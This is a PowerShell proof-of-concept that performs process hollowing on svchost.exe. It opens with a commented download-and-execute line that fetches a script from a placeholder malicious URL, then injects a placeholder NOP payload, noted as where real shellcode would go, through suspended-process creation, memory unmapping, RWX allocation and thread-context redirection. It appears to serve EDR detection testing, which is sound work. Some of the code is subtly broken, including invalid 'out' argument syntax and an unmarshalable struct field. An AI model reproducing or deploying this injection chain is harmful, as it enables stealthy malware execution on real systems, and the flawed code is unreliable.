#powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('#{server.malicious.url}/Invoke-ProcessHollowing.ps1'); Invoke-ProcessHollowing -Target 'C:\Windows\System32\svchost.exe'"
function Invoke-ProcessHollowing {
    param (
        [Parameter(Mandatory=$true)]
        [string]$TargetProcess
    )

    Write-Host "[*] Initializing Full Process Hollowing Chain (x64)..." -ForegroundColor Cyan

    $Win32APIs = @"
    using System;
    using System.Runtime.InteropServices;

    public class NativeMethods {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public uint cb; public IntPtr lpReserved, lpDesktop, lpTitle; public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64 {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            public byte[] Header; // Omitted for brevity in PoC
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);

        [DllImport("ntdll.dll")]
        public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);

        [DllImport("kernel32.dll")]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);
    }
"@

    Add-Type -TypeDefinition $Win32APIs
    
    # 1. Start Suspended (0x4)
    $SI = New-Object NativeMethods+STARTUPINFO
    $PI = New-Object NativeMethods+PROCESS_INFORMATION
    [NativeMethods]::CreateProcess($TargetProcess, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$SI, out $PI) | Out-Null
    Write-Host "[+] Created Suspended Process: $($PI.dwProcessId)" -ForegroundColor Green

    # 2. Define Benign Payload (NOP Sled)
    # In a real attack, this would be your shellcode buffer.
    $Payload = [byte[]](0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
    $BaseAddress = [IntPtr]0x400000 # Typical ImageBase placeholder

    # 3. Hollow the Process
    Write-Host "[*] Hollowing memory via NtUnmapViewOfSection..." -ForegroundColor Yellow
    [NativeMethods]::NtUnmapViewOfSection($PI.hProcess, $BaseAddress) | Out-Null

    # 4. Reallocate and Write
    Write-Host "[*] Allocating RWX memory and writing payload..." -ForegroundColor Yellow
    $Allocated = [NativeMethods]::VirtualAllocEx($PI.hProcess, $BaseAddress, [uint32]$Payload.Length, 0x3000, 0x40)
    [NativeMethods]::WriteProcessMemory($PI.hProcess, $Allocated, $Payload, [uint32]$Payload.Length, [out][IntPtr]::Zero) | Out-Null

    # 5. Redirect Context
    Write-Host "[*] Redirecting thread execution context..." -ForegroundColor Yellow
    $Ctx = New-Object NativeMethods+CONTEXT64
    $Ctx.ContextFlags = 0x100001 # CONTEXT_CONTROL
    [NativeMethods]::GetThreadContext($PI.hThread, [ref]$Ctx) | Out-Null
    
    # Set the Instruction Pointer (Rip) to our new allocated memory
    $Ctx.Rip = [uint64]$Allocated
    [NativeMethods]::SetThreadContext($PI.hThread, [ref]$Ctx) | Out-Null

    # 6. Resume
    Write-Host "[+] Resuming thread. Watch your EDR!" -ForegroundColor Green
    [NativeMethods]::ResumeThread($PI.hThread) | Out-Null
}
